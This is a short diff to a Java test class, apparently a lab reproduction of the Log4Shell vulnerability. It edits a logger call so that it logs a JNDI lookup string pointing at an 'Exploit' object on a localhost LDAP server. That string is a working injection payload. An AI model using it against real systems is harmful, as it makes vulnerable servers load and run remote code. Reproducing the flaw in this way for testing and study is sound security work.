@@ -11,7 +11,7 @@ public class Log4jBug {
     private static final Logger logger = LogManager.getLogger(Log4jBug.class);
 
     public static void TestLog4j() {
-        logger.info("==> {}", "${jndi:rmi://127.0.0.1:8888/Exploit}");
+        logger.info("${jndi:ldap://127.0.0.1:8888/Exploit}");
     }
 
     public static void main(String[] args) {
